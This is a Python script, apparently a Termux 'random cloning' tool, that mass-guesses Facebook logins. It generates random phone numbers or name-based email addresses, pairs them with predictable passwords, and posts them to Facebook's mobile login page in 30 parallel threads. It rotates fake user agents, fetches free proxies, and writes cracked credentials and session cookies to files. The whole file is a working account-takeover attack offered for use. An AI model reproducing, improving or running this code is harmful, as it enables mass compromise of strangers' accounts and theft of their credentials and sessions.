#Create By: ARFAN
#---------------------------------------------------------------------------#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
os.system('xdg-open https://github.com/Arjoker04')
logo =("""          \033[1;37m____ \033[1;32m                       \033[1;37m____   
          \033[1;37m____ \033[1;32m                       \033[1;37m____   
          \033[1;37m| (     \033[1;93m	███████ ██   ██ ██████		\033[1;92m\033[1;37m) | 
          \033[1;37m| |      \033[1;93m██      ██  ██  ██   ██	\033[1;92m\033[1;37m| |  
          \033[1;37m| |      \033[1;93m███████ █████   ██████	\033[1;92m\033[1;37m| |  
          \033[1;37m| |      \033[1;93m     ██ ██  ██  ██   ██	\033[1;92m\033[1;37m| |  
          \033[1;37m| (__  \033[1;93m     ██ ██  ██  ██   ██	\033[1;92m\033[1;37m__) |  
          \033[1;37m(____)\033[1;93m███████ ██   ██ ██████	\033[1;92m\033[1;37m(____)
    
            \033[1;37m \033[1;36m\033[1;37m═\033[44m\033[1;37m[ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐦𝐲 𝐰𝐨𝐫𝐥𝐝🌍 ]\x1b[0m═\033[1;36m\033[1;37m
    
\033[1;37m╔\033[1;36m════\033[1;37m═══════════════════\033[1;36mARFAN✯SKB\033[1;37m═════════════════\033[1;36m════\033[1;37m╗
\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴀᴜᴛʜᴏʀ]\033[1;31m  ➟  \033[1;32mMd.ARFAN Ahammed         \033[1;31m       │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ꜰᴀᴄᴇʙᴏᴏᴋ]\033[1;31m➟  \033[1;32mMd.ARFAN Ahammed          \033[1;31m      │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ɢɪᴛʜᴜʙ]\033[1;31m  ➟ \033[1;32m Arjoker04                 \033[1;31m        │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ʏᴏᴜᴛᴜʙᴇ]\033[1;31m ➟  \033[1;32mitzjoker                  \033[1;31m        │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴠᴇʀꜱᴏɴ]\033[1;31m  ➟  \033[1;32m1.2                          \033[1;31m      │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ɢʀᴏᴜᴘ]\033[1;31m   ➟  \033[1;32mARFAN TERMUX COMMAND \033[1;37m {\033[1;36mARFAN\033[1;37m} \033[1;31m     │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴡʜᴀᴛꜱᴀᴘᴘ]\033[1;31m➟  \033[1;32m01997745734\033[1;37m \033[1;36m \033[1;37m \033[1;31m                     │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ɴᴇᴛᴡᴏʀᴋ]\033[1;31m ➟  \033[1;32m3G,4G,5G \033[1;37m {\033[1;36mON Mobile Data\033[1;37m} \033[1;31m        │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴄᴏɴᴛᴀᴄᴛ]\033[1;31m ➟  \033[1;32marhridoy339@gmail.com\033[1;37m \033[1;36m\033[1;37m \033[1;31m │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴛᴏᴏʟꜱ]\033[1;31m   ➟  \033[1;32mRENDOM CLONING \033[1;37m  \033[1;31m                  │
\033[1;37m╚\033[1;36m════\033[1;37m═════\033[41m\033[1;37m[ NA XUDI FMZ NA XUDI CELEBRITY🖕 ]\x1b[0m═════\033[1;36m═════\033[1;37m╝

\033[1;31m========================================================""")           
class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(" [01] Random Number Clone")
        print(" [02] Random Email Clone ")
        print(" [00] Exit")
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        ARFAN =input(" [?] Choose : ")
        os.system('xdg-open https://www.facebook.com/arfanahammed.29')
        if ARFAN in ["1", "01"]:
            num()
        if ARFAN in ["2","02"]:
            gml()
        if ARFAN in [" 0", "00"]:
            exit()
        else:
            exit()
def num():
    user=[]
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    kode = input(' [?] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input(' [?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
        print(' \033[1;97m[+] Process has been started')
        print(' \033[1;97m[!] Wait for ids ')
        print(' \033[1;97m[!] Use flight mode for speed up ')
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')

def gml():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [?] Target fast name : ')
    os.system('clear')
    print(logo)
    kodex = input(' [?] Target last name :  ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    doamin = input(' [?] Terget doamin : ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input('[?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
        print(' \033[1;97m[+] Process has been started')
        print(' \033[1;97m[!] Wait for ids ')
        print(' \033[1;97m[!] Use flight mode for speed up ')
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mARFAN\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'origin': 'https://mbasic.facebook.com',
            'referer': 'https://mbasic.facebook.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[ARFAN-OK] {uid} | {ps}")
                print(f" Cookie : {coki}")
                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[ARFAN-CP] {cid}|{ps}")
                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[ARFAN] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()